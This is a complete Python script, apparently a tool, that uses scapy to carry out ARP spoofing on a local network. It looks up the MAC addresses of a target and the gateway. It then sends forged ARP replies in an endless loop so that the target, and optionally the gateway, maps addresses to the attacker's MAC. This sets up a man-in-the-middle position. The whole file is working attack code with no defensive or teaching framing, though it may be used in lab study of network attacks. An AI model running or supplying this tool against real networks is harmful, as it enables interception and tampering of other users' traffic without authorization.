from time import sleep
import argparse
import netifaces
from scapy.all import *
from getmac import get_mac_address as gma


def main(args):
    iface = args.iface
    src = args.src
    delay = args.delay
    gw = args.gw
    target = args.target

    got_src = True

    if not iface:
        iface = 'eth0'
    if not src:
        got_src = False
        src = get_gw_ip(iface)
    if not delay:
        delay = 1
    if not gw:
        gw = False

    gw_ip = get_gw_ip(iface)
    target_mac = get_mac_by_ip(target)
    gw_mac = get_mac_by_ip(gw_ip)
    my_mac = gma()
    # my_mac = ':'.join(("%012X" % my_mac)[i:i+2] for i in range(0, 12, 2))

    while True:
        send_ARP_response(iface, src, target, gw, gw_ip, target_mac, my_mac, gw_mac, got_src)
        sleep(delay)


def send_ARP_response(iface, src, target, gw, gw_ip, dst_mac, my_mac, gw_mac, got_src):
    send_is_at(iface, target, dst_mac, my_mac, src)
    if gw:
        if got_src:
            send_is_at(iface, gw_ip, gw_mac, my_mac, src)
        else:
            send_is_at(iface, gw_ip, gw_mac, my_mac, target)


def get_gw_ip(iface):
    gateways = netifaces.gateways()
    return gateways['default'][netifaces.AF_INET][0]


def send_is_at(iface, target, dst_mac, my_mac, ip):
    print('sending \'is_at\' to ' + target + ' (mac: ' + dst_mac + '), that will convince him that the mac of ' + ip + ' is my mac (' + my_mac + ')...')
    packet = Ether(dst=dst_mac, src=my_mac) / ARP(op=2, hwsrc=my_mac, psrc=ip, hwdst=dst_mac, pdst=target)
    sendp(packet, iface=iface)


def get_mac_by_ip(dst_ip):
    my_ip = get_if_addr(conf.iface)
    response = sr(ARP(op=1, psrc=my_ip, pdst=dst_ip), timeout=5)
    return response[0][ARP][0][1].hwsrc


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Spoof ARP tables')
    parser.add_argument('-i', '--iface', type=str, help='Interface you wish to use')
    parser.add_argument('-s', '--src', type=str, help='The address you want for the attacker')        
    parser.add_argument('-d', '--delay', type=int, help='Delay (in seconds) between messages')
    parser.add_argument('-gw', help='should GW be attacked as well?', action='store_true')
    parser.add_argument('-t', '--target', type=str, help='IP of target', required=True)
    args = parser.parse_args()

    main(args)
